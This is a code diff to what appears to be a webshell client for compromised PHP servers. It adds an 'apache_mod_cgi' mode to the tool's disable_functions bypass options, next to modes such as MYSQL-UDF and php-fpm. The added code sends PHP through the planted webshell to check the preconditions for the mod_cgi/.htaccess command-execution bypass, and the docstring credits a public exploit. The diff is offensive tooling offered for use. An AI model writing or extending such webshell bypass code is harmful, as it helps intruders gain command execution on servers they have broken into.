@@ -18,6 +18,7 @@ mode_to_desc_dict = {-1: color.red("closed"),
                      8: color.green("MYSQL-UDF"),
                      9: color.green("php7-SplDoublyLinkedList"),
                      10: color.green("php-fpm"),
+                     11: color.green("apache_mod_cgi"),
                      }
 mode_linux_set = {1, 2, 3, 4, 5, 9}
 mode_windows_set = {6, }
@@ -194,6 +195,19 @@ def set_mode(mode: int, test: bool = False):
                  requirements_dict["host"], True, "webshell")
             gset("webshell.bdf_fpm.port", str(
                 requirements_dict["port"]), True, "webshell")
+    elif (mode == 11):  # apache-mod-cgi
+        res = send("""$f=in_array('mod_cgi', apache_get_modules());
+$f2=is_writable('.');
+$f3=!empty($_SERVER['HTACCESS']);
+if(!$f){
+    die("Mod-Cgi not enabled");
+} else if (!$f2) {
+    die("Current directory not writable");
+}
+print("success");""")
+        if (res.r_text != "success"):
+            print(color.red(f"\n{res.r_text}\n"))
+            return False
     if (not test):
         if (mode in (7, 10)):
             print(color.yellow(
@@ -306,6 +320,14 @@ def run(mode: str = '0'):
           - gopher: curl extension, fpm can access by http
           - sock: stream_socket_client function, fpm can access by sock
           - http_sock: fsockopen / pfsockopen function, fpm can access by http
+
+    Mode 11 apache-mod-cgi
+        Origin:
+        - https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/exp/apache_mod_cgi/exp.php
+
+        Need:
+        - apache_mod_cgi
+        - allow .htaccess
     """
     if (mode == "close"):
         mode = -1
